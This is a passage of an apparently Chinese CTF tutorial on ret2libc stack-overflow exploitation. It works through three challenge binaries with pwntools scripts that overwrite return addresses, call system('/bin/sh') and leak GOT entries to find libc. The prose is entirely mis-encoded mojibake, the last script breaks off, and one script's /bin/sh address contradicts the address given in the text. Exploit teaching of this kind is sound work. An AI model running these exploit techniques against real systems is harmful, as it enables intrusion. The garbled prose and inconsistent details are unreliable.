alt=""></p><p>ä¸€æ—¦åœ°å€è¢«å¡«å……ï¼Œåç»­æ‰€æœ‰å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨éƒ½ä¼šç›´æ¥é€šè¿‡ GOT è·³è½¬åˆ°ç›®æ ‡å‡½æ•°ï¼Œæ— éœ€å†æ¬¡è§£æã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºå¯ä»¥çœ‹åˆ°æ­¤æ—¶Açš„GOTè¡¨å·²ç»æ›´æ–°ï¼Œå¯ä»¥ç›´æ¥åœ¨GOTè¡¨ä¸­æ‰¾åˆ°å…¶åœ¨å†…å­˜ä¸­çš„ä½ç½®å¹¶ç›´æ¥è°ƒç”¨ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/msedge_ItT81O2Nmz.png" alt=""></p><h2 id="5-2-ä¾‹1-ret2libc1">5.2 ä¾‹1 ret2libc1</h2><p>æˆ‘ä»¬è¿˜æ˜¯é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹ä¸€ä¸‹æ–‡ä»¶å¼€å¯çš„ä¿æŠ¤ã€‚å‘ç°å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/2025-05-19113837.png" alt=""></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨idaåæ±‡ç¼–åå»mainå‡½æ•°æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_q99lgGQMad.png" alt=""></p><p>å‘ç°æœ‰getsè¿™ä¸ªå±é™©å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ¥ä¸‹æ¥æ€è€ƒå¦‚ä½•å»åˆ©ç”¨ã€‚æŸ¥çœ‹stringå­—ç¬¦ä¸²åå‘ç°&quot;/bin/sh&quot;ï¼Œå¹¶å¾—åˆ°å…¶åœ°å€0x0804A03Cï¼Œæ¥ä¸‹æ¥å¯»æ‰¾systemå‡½æ•°å³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_yhz7rjxhnw.png" alt=""></p><p>æ¥ä¸‹æ¥æ‰¾åˆ°å¤–éƒ¨å‡½æ•°systemçš„è°ƒç”¨ï¼Œå¾—åˆ°è°ƒç”¨åœ°å€ä¸º0x08048460</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_z9lQUx1aoW.png" alt=""></p><p>é‚£å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥çœ‹ä¸€ä¸‹éœ€è¦åˆ¶é€ å¤šå°‘åƒåœ¾æ•°æ®å¡«å……å³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_aRHFdSeeOY.png" alt=""></p><p>å¾—å‡ºéœ€è¦å¡«å……0xb8-0x4c+4ä¸ªåƒåœ¾æ•°æ®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ„é€ çš„payloadä¸­systemå‡½æ•°éœ€è¦å…ˆå‹å…¥returnåœ°å€åˆ°æ ˆä¸­ï¼Œéšåæ‰æ˜¯systemå‡½æ•°çš„å‚æ•°å‹å…¥æ ˆã€‚å› æ­¤æ„é€ POCå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x08048460</span><br><br>bin_sh=<span class="hljs-number">0x08048720</span><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xb8</span>-<span class="hljs-number">0x4c</span>+<span class="hljs-number">4</span>)+p32(system_addr)+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨æˆåŠŸï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_xB7obxY3Hs.png" alt=""></p><p>è¿™é“é¢˜ç›¸å¯¹ç®€å•ï¼ŒåŒæ—¶æä¾›äº†&quot;/bin/sh&quot;å’Œsystemå‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯å¤§å¤šæ•°ç¨‹åºå¹¶ä¸ä¼šæœ‰è¿™ä¹ˆå¥½çš„æƒ…å†µã€‚</p><h2 id="5-3-ä¾‹2-ret2libc2">5.3 ä¾‹2 ret2libc2</h2><p>ç…§ä¾‹æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_yq764FmRcc.png" alt=""></p><p>æœ‰çš„äººçœ‹åˆ°è¿™éƒ¨åˆ†è·Ÿret2syscallé‚£ä¸ªå¾ˆåƒï¼Œä½†æ˜¯å…¶å®ret2syscalléœ€è¦ä½¿ç”¨ROPæ„é€ ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸­å¹¶æ²¡æœ‰ç›¸åº”çš„ROPï¼Œæ¯”å¦‚æˆ‘ä»¬æ‰¾ä¸€ä¸‹pop eax;retï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_SngC1QlvyC.png" alt=""></p><p>å‘ç°æ‰¾ä¸åˆ°ï¼Œå…¶å®è¿™ä¹Ÿå°±æ„å‘³ç€ret2syscallæ‰€éœ€è¦çš„æ¡ä»¶æ›´è‹›åˆ»ï¼Œä¹Ÿå°±æ˜¯é¢˜ç›®æ›´ç®€å•ã€‚æˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹mainå‡½æ•°ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_KROcn7WWCc.png" alt=""></p><p>åŒæ ·çš„å­˜åœ¨getså±é™©å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯è¿™é“é¢˜å¹¶æ²¡æœ‰æä¾›&quot;/bin/sh&quot;ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_WEBntSf3Wq.png" alt=""></p><p>å…ˆçœ‹çœ‹æŸ¥æ‰¾ä¸€ä¸‹systemçš„åœ°å€ï¼Œä¸º0x08048490</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_mRSKCIQ6wA.png" alt=""></p><p>æ¥ä¸‹æ¥å°±æ˜¯è§£å†³&quot;/bin/sh&quot;å­—ç¬¦ä¸²çš„é—®é¢˜äº†ã€‚è¿™é‡Œç”±äº&quot;/bin/sh&quot;éœ€è¦ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ å…¥systemä¸­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†&quot;/bin/sh&quot;æ³¨å…¥åˆ°bssæ®µä¸­ã€‚æˆ‘ä»¬è¿™é‡Œå…ˆå°è¯•è¿™æ ·è§£å†³ï¼Œå¦‚æœbssæ®µæ²¡æœ‰å…¨å±€å˜é‡å†æƒ³å…¶ä»–åŠæ³•ï¼Œä¸è¿‡å¥½åœ¨è¿™é¢˜å¹¶ä¸å¤æ‚ï¼Œé¢˜ç›®ç»™å‡ºäº†buf2å…¨å±€å˜é‡ï¼Œåœ°å€ä¸º0x0804A080ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_z3m1KBqjA2.png" alt=""></p><p>æˆ‘ä»¬éœ€è¦è°ƒç”¨getså‡½æ•°ï¼Œè¯»å–ä¸€ä¸ª/bin/shæ”¾åœ¨buf2ï¼Œéšåå°†buf2å½“ä½œsystemçš„å‚æ•°ä¼ å…¥ã€‚å…ˆæ‰¾åˆ°getså‡½æ•°ï¼Œæˆ‘ä»¬å»pltè¡¨çœ‹ï¼Œgetsåœ°å€ä¸º0x08048460ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_7DhuPY1MxY.png" alt="ida_7DhuPY1MxY"></p><p>è°ƒç”¨getså‡½æ•°æ—¶ï¼Œä¼šå°†getså‡½æ•°çš„è¿”å›åœ°å€ä¹Ÿå‹å…¥æ ˆä¸­ï¼Œéšåè¢«å‹å…¥æ ˆçš„æ˜¯getså‡½æ•°çš„å‚æ•°ã€‚å½“getså‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šæ‰¾åˆ°esp+8çš„ä½ç½®ä¹Ÿå°±æ˜¯å‚æ•°çš„ä½ç½®ï¼Œ<strong>å½“æˆ‘ä»¬æƒ³è¦å¼¹å‡ºå‚æ•°åé¢çš„systemåœ°å€çš„æ—¶å€™ï¼Œå°±éœ€è¦å°†å‚æ•°popå‡ºæ¥ï¼Œç„¶åretå°±ä¼šå¼¹å‡ºä¸‹ä¸€ä¸ªåœ°å€å¹¶è·³è½¬æ‰§è¡Œ</strong>ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªpop å¯„å­˜å™¨;retæŒ‡ä»¤ï¼Œå°†getså‡½æ•°å‚æ•°popå‡ºæ¥ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä¸æ˜¯æ„é€ ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥éšä¾¿ä¸€ä¸ªpop retå³å¯ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_JBzY9baMHR.png" alt="MobaXterm_JBzY9baMHR"></p><p>è¿™é‡Œå› ä¸ºebpæœ€å¥½ä¸è¦åŠ¨ï¼Œæˆ‘ä»¬é€‰ç¬¬ä¸‰ä¸ªï¼Œåœ°å€ä¸º0x0804843dï¼Œè¿™æ—¶å€™æˆ‘ä»¬æƒ³æƒ³æ ˆç»“æ„æ˜¯æ€ä¹ˆæ ·çš„</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> ä½åœ°å€                         </span>|<br>|<span class="hljs-string"> &#x27;a&#x27;*112 (è¦†ç›–åˆ°è¿”å›åœ°å€)         </span>|<span class="hljs-string"> â† å¡«å…… ebp-0xb8 åˆ° ebp+4</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> gets_addr (0x08048460)        </span>|<span class="hljs-string"> â† è¦†ç›–åŸå§‹è¿”å›åœ°å€</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> pop_ebx_ret (0x0804843d)      </span>|<span class="hljs-string"> â† getsè¿”å›åæ‰§è¡Œ</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> buf2 (0x0804A080)             </span>|<span class="hljs-string"> â† getsçš„å‚æ•°ï¼Œè¢«ä¹‹åä¼šè¢«popå‡ºæ¥</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> system_addr (0x08048490)      </span>|<span class="hljs-string"> â† retä¹‹åä¼šå°†å…¶å¼¹å‡ºå¹¶æ‰§è¡Œ</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> &#x27;bbbb&#x27; (ä¼ªè¿”å›åœ°å€)             </span>|<span class="hljs-string"> â† systemçš„è¿”å›åœ°å€ï¼ˆæ— æ„ä¹‰ï¼‰</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> buf2 (0x0804A080)             </span>|<span class="hljs-string"> â† systemçš„å‚æ•°ï¼ˆ/bin/shåœ°å€ï¼‰</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> é«˜åœ°å€                         </span>|<br>|<span class="hljs-string">-------------------------------</span>|<br></code></pre></td></tr></table></figure><p>æ€è·¯ç¡®å®šå¥½åå°±æ˜¯æŸ¥çœ‹å¡«å……å¤šå°‘å­—ç¬¦äº†</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_K6AOQOwaKP.png" alt=""></p><p>å¡«å……é‡å’Œä¸Šä¸€é¢˜æ˜¯ä¸€æ ·çš„ï¼Œå†™POCï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>pop_ebx_ret=<span class="hljs-number">0x0804843d</span><br><br>gets_addr=<span class="hljs-number">0x08048460</span><br><br>system_addr=<span class="hljs-number">0x08048490</span><br><br>buf2=<span class="hljs-number">0x0804A080</span><br><br>bin_sh=<span class="hljs-string">&quot;/bin/sh&quot;</span><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xb8</span>-<span class="hljs-number">0x4c</span>+<span class="hljs-number">4</span>)+p32(gets_addr)+p32(pop_ebx_ret)+p32(buf2)+p32(system_addr)+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p32(buf2)<br><br>r.sendline(p1)<br>r.sendline(bin_sh)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/pycharm64_Ll2Jtc5gkR.png" alt="pycharm64_Ll2Jtc5gkR"></p><h2 id="5-4-ä¾‹3-ret2libc3">5.4 ä¾‹3 ret2libc3</h2><p>è¿˜æ˜¯ç…§å¸¸æŸ¥çœ‹ä¸€ä¸‹å¼€å¯çš„ä¿æŠ¤ï¼Œå‘ç°å¼€å¯äº†å †æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729173001215.png" alt="image-20250729173001215"></p><p>éšåå…ˆé€†å‘çœ‹ä¸€ä¸‹å‡½æ•°çš„æ¼æ´</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729173523627.png" alt="image-20250729173523627"></p><p>æŸ¥çœ‹å‘ç°ä¸å­˜åœ¨&quot;/bin/sh&quot;ï¼Œå†æŸ¥çœ‹å‡½æ•°å‘ç°ä¹Ÿä¸å­˜åœ¨systemå‡½æ•°ï¼Œé‚£å°±åªèƒ½è‡ªå·±æ‰¾äº†ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½å¯ä»¥ä½¿ç”¨pltè¡¨æŸ¥çœ‹åˆ°ï¼Œè€Œä¸”ç‰¹å®šç‰ˆæœ¬çš„libcåº“ä¸­å‡½æ•°çš„ä½ç½®éƒ½æ˜¯å›ºå®šçš„ï¼Œåªè¦æ³„éœ²å‡ºå…¶ä¸­ä¸€ä¸ªå‡½æ•°çš„åœ°å€å°±å¯ä»¥çŸ¥é“system()å‡½æ•°çš„åœ°å€ï¼Œä»è€Œèƒ½å…¥ä¾µç›®æ ‡ã€‚</p><p>è€Œä¹‹å‰æˆ‘ä»¬æåˆ°ï¼Œä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨ä¹‹åä¼šåœ¨gotè¡¨ä¸­ä¿å­˜å…¶åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å°±æœ‰äº†é€šè¿‡æ³„éœ²gotè¡¨å†…å­˜æ¥æ³„éœ²å‡½æ•°åœ°å€çš„æƒ³æ³•ã€‚è¿™é‡Œæˆ‘ä»¬æ³„éœ²ä¸€ä¸‹putså‡½æ•°çš„åœ°å€å³å¯ã€‚</p><p>æ¥ä¸‹æ¥æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼Œé¦–å…ˆä¸ºäº†æ³„éœ²å‡ºå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨putså‡½æ•°è¿›è¡Œç¨‹åºçš„è¾“å‡ºï¼Œåé¢å¡«å……çš„å››ä¸ªè‡ªå·±éœ€è¦æ—¶putså‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬è¦æ±‚putså‡½æ•°æ‰§è¡Œå®Œæˆåå†æ¬¡è¿”å›mainå‡½æ•°çš„èµ·å§‹ä½ç½®ï¼Œæ•…è¿™ä¸ªä½ç½®åº”å½“å¡«å†™mainå‡½æ•°èµ·å§‹ä½ç½®çš„åœ°å€ï¼Œå†å¾€åçš„å››ä¸ªå­—èŠ‚åº”å½“å¡«å†™putså‡½æ•°çš„å‚æ•°ï¼Œå³ä»»æ„ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥å¡«putsçš„gotã€‚å› æ­¤payloadå¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = b<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-literal">off</span>set + puts_plt + addr_start + puts_got<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>addr_main = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># è·å–_startå‡½æ•°çš„åœ°å€</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># gotè¡¨ä¸­æŒ‡å‘__libc_start_mainçš„æŒ‡é’ˆ</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_main) + p32(puts_got)<br><br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#ä»è¿›ç¨‹è¾“å‡ºé‡Œæ¥æ”¶æ•°æ®ï¼Œæˆªå–å‰ 4 ä¸ªå­—èŠ‚ï¼Œå¹¶æŠŠå®ƒä»¬è½¬æˆä¸€ä¸ª 32 ä½æ•´æ•°</span><br>put_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr=&#x27;</span>+<span class="hljs-built_in">hex</span>(put_addr))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¿›ç¨‹è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„æ˜¯gotè¡¨ä¸­æŒ‡å‘çš„åœ°å€ï¼Œ32ä½æ“ä½œç³»ç»Ÿä¸­åœ°å€å¤§å°ä¸º4å­—èŠ‚ï¼Œä¸ºäº†é˜²æ­¢è·å–åˆ°çš„è¾“å‡ºå†…å®¹ä¸­æœ‰å…¶ä»–ç±»ä¼¼äºâ€™\nâ€™çš„ç¬¦å·ï¼Œåªéœ€è¦å–å‰4å­—èŠ‚å³å¯ã€‚æŸ¥çœ‹è¾“å‡ºå¯ä»¥å‘ç°ä¸¤æ¬¡è¾“å‡ºä¸ä¸€æ ·ï¼Œè¿™æ˜¯å› ä¸ºå¼€å¯äº†ASLR ä¿æŠ¤ï¼Œä½†æ˜¯ASLR ä¿æŠ¤ä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827163944409.png" alt="image-20250827163944409"></p><p>ä½†æ˜¯è¿™é‡ŒæŸ¥é˜…<a href="https://libc.rip/">libc database search</a>å‘ç°æœ‰å¥½å‡ ä¸ªå¯èƒ½çš„libcï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827164038898.png" alt="image-20250827164038898"></p><p>è¿™é‡Œç¬”è€…ä¸æƒ³ä¸€ä¸ªä¸ªè¯•ï¼Œäºæ˜¯ç¬”è€…æƒ³åˆ°å¤šæ³„éœ²å‡ ä¸ªå‡½æ•°çš„åœ°å€å¯èƒ½ä¼šç¼©å°libcå¯èƒ½çš„èŒƒå›´ï¼Œäºæ˜¯ä¿®æ”¹è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr_start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># è·å–_startå‡½æ•°çš„åœ°å€</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># gotè¡¨ä¸­æŒ‡å‘__libc_start_mainçš„æŒ‡é’ˆ</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(puts_got)<br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#ä»è¿›ç¨‹è¾“å‡ºé‡Œæ¥æ”¶æ•°æ®ï¼Œæˆªå–å‰ 4 ä¸ªå­—èŠ‚ï¼Œå¹¶æŠŠå®ƒä»¬è½¬æˆä¸€ä¸ª 32 ä½æ•´æ•°</span><br>puts_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_putsï¼š&#x27;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment">#å†æ¬¡è·å–ï¼Œè¿™æ¬¡è·å–_startå‡½æ•°çš„çœŸå®åœ°å€</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(libc_start_main)<br>r.sendline(payload)<br><br>real_addr_start = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_startï¼š&#x27;</span>+<span class="hljs-built_in">hex</span>(real_addr_start))<br></code></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åå†æ¬¡å°è¯•æœç„¶é”å®šäº†libcï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827170822793.png" alt="image-20250827170822793"></p><p><strong>åŸºåœ°å€ = çœŸå®åœ°å€ - åç§»åœ°å€</strong>ï¼ŒçŸ¥é“åç§»ä¹‹åé‚£æˆ‘ä»¬å°±èƒ½å†™æœ€ç»ˆçš„åˆ©ç”¨è„šæœ¬äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr_start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># è·å–_startå‡½æ•°çš„åœ°å€</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># gotè¡¨ä¸­æŒ‡å‘__libc_start_mainçš„æŒ‡é’ˆ</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(puts_got)<br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#ä»è¿›ç¨‹è¾“å‡ºé‡Œæ¥æ”¶æ•°æ®ï¼Œæˆªå–å‰ 4 ä¸ªå­—èŠ‚ï¼Œå¹¶æŠŠå®ƒä»¬è½¬æˆä¸€ä¸ª 32 ä½æ•´æ•°</span><br>puts_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_putsï¼š&#x27;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment">#å†æ¬¡è·å–ï¼Œè¿™æ¬¡è·å–_startå‡½æ•°çš„çœŸå®åœ°å€</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(libc_start_main)<br>r.sendline(payload)<br><br>real_addr_start = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_startï¼š&#x27;</span>+<span class="hljs-built_in">hex</span>(real_addr_start))<br><br><span class="hljs-comment">#æ‰¾åˆ°systemå‡½æ•°å’Œbin/shä¹‹åæ‰§è¡Œåˆ©ç”¨ç¨‹åºï¼Œè¿›å…¥shell</span><br><span class="hljs-comment">#è·å–åŸºåœ°å€</span><br>libc_start_offset = <span class="hljs-number">0x1ade0</span><br>base_libc = real_addr_start - libc_start_offset<br>offset_system=<span 